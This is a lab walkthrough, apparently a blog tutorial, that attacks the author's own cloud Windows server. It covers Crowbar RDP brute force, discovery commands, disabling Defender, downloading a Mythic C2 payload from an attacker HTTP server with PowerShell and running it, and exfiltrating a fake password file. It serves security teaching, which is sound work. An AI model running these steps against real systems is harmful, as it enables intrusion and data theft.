# Day-21-Simulating-a-Brute-Force-Attack-with-Mythic-C2

In today’s guide, we will dive into an exciting exercise where we perform a brute force attack on a Windows server and generate our own Mythic agent to establish a Command and Control (C2) session. For this demonstration, we’ll use **Kali Linux**, **Mythic C2**, and a **Windows Server** hosted on Vultr’s cloud platform. By the end, you’ll have a complete walkthrough of the attack phases—from brute-forcing a password to executing payloads on a compromised Windows machine.

## Attack Phases

The guide is divided into six attack phases:

1. **Initial Access**
2. **Discovery**
3. **Defense Evasion**
4. **Execution**
5. **Command & Control**
6. **Exfiltration**

> **Disclaimer**: This tutorial is for educational purposes only. Do NOT attempt this on any system you don’t have permission to access. Engaging in unauthorized hacking activities can lead to legal consequences.

---

## Setting Up for the Attack

Before jumping into the action, let’s set up our environment. I’m using **Vultr** to host a Windows server, but you can use any cloud platform.

### Step 1: Create a Fake File on Windows Server

1. Log in to your Vultr account and open the Windows Server console.
2. Create a file called `passwords.txt` on the server’s desktop.
3. Write a fake password (e.g., `SuperSecret123!`) to simulate sensitive information.
4. Change the server password via Group Policy, reducing the minimum password character limit to 5, and update your password.

---

## Attack Walkthrough

### Phase 1: Initial Access — Brute Force Attack Using Kali Linux

#### Step 1: Setting Up the Target — Fake Password File

1. Log in to your Windows Server and create a file called `passwords.txt` on the desktop.
2. Write a fake password (e.g., `SuperSecret123!`).
3. Update the server’s password by allowing shorter passwords (minimum 5 characters).

#### Step 2: Prepare a Custom Wordlist in Kali Linux

1. Navigate to the wordlist directory:
    ```bash
    cd /usr/share/wordlists
    ```
2. Use the first 50 lines of the `brute.txt` wordlist to create a smaller list:
    ```bash
    head -50 brute.txt > /home/kali/aurora-wordlist.txt
    ```
3. Edit the wordlist and insert the real password for proof of concept:
    ```bash
    nano /home/kali/aurora-wordlist.txt
    ```

#### Step 3: Brute Force the Windows RDP Login

1. Install Crowbar, a brute-force tool for RDP:
    ```bash
    sudo apt-get install -y crowbar
    ```
2. Run Crowbar to brute force the RDP login:
    ```bash
    crowbar -b rdp -u Administrator -C /home/kali/brute.txt -s [Windows-Server-IP]/32
    ```

### Phase 2: Discovery — Gathering Information on the Compromised Server

1. RDP into the Windows Server using `xfreerdp`:
    ```bash
    xfreerdp /u:Administrator /p:[Brute-Forced-Password] /v:[Windows-Server-IP]:3389
    ```
2. Execute basic discovery commands:
    ```bash
    whoami
    ipconfig
    net user
    net group
    ```

### Phase 3: Defense Evasion — Disabling Windows Defender

1. Open Windows Security and go to **Virus & Threat Protection**.
2. Turn off **Real-time protection**.

### Phase 4: Execution — Deploying the Mythic C2 Agent

#### Step 1: Install the Apollo Agent in Mythic

1. Install the Apollo agent:
    ```bash
    ./mythic-cli install GitHub https://github.com/MythicAgents/Apollo.git
    ```

#### Step 2: Install the HTTP C2 Profile

1. Install the HTTP C2 Profile:
    ```bash
    ./mythic-cli install GitHub https://github.com/MythicC2Profiles/http
    ```

#### Step 3: Generate the Payload

1. In Mythic’s GUI, generate a new payload for Windows using the HTTP C2 profile.

#### Step 4: Download the Payload via SSH

1. Download the payload with `wget`:
    ```bash
    wget [payload-url] --no-check-certificate
    ```

#### Step 5: Host the Payload on an HTTP Server

1. Serve the payload using Python HTTP server:
    ```bash
    python3 -m http.server 9999
    ```
2. Allow traffic through the firewall:
    ```bash
    sudo ufw allow 9999
    ```

#### Step 6: Download and Execute the Payload on Windows Server

1. Download the payload using PowerShell:
    ```powershell
    Invoke-WebRequest -Uri http://[Mythic-Server-IP]:9999/svc-aurora.exe -Outfile "C:\Users\Public\downloads\svc-aurora.exe"
    ```

2. Execute the payload:
    ```powershell
    .\svc-aurora.exe
    ```

### Phase 5: Command & Control — Establishing a C2 Session

1. Confirm the callback in Mythic’s GUI.
2. Interact with the compromised server using Mythic.

### Phase 6: Exfiltration — Stealing the Fake Password File

1. Download the fake file using Mythic:
    ```bash
    download C:\Users\Administrator\Documents\passwords.txt
    ```

---

## Conclusion: Power and Responsibility

While this attack scenario demonstrates the power of tools like Mythic C2, remember to use this knowledge ethically and responsibly. Always have explicit permission before testing any system.

In the next blog, we’ll focus on defensive measures to detect and monitor Mythic C2 activities. Stay tuned!

---

### Safety Disclaimer

This guide is designed for educational purposes. Unauthorized access to computer systems is illegal and unethical. Use these skills to secure systems, not exploit them.

